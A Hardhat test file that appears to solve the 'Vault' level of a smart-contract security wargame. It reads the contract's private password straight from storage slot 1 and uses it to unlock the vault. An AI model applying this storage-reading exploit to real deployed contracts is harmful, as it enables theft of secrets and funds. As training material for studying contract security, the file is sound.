import { loadFixture } from "@nomicfoundation/hardhat-toolbox/network-helpers";
import { expect } from "chai";
import hre from "hardhat";

import { Vault, VaultFactory, VaultFactory__factory, Vault__factory } from "../typechain-types";
import { FixtureContext, FixtureLevel, deployEssentials, deployLevel } from "./fixtures";
import { completeLevel } from "./helpers";

describe("8. Vault", function () {
  let context: FixtureContext;
  let level: FixtureLevel<VaultFactory, Vault>;

  beforeEach(async function () {
    context = await loadFixture(deployEssentials);
    level = await deployLevel(context, VaultFactory__factory, (address, signer) =>
      Vault__factory.connect(address, signer),
    );
  });

  it("should be attacked successfully", async function () {
    expect(await level.instance.locked()).to.be.true;

    const password = await hre.ethers.provider.getStorage(level.instance, 1);
    const tx = await level.instance.unlock(password);
    await expect(tx).to.be.not.reverted;
    await tx.wait();

    expect(await level.instance.locked()).to.be.false;

    await completeLevel(context, level);
  });
});
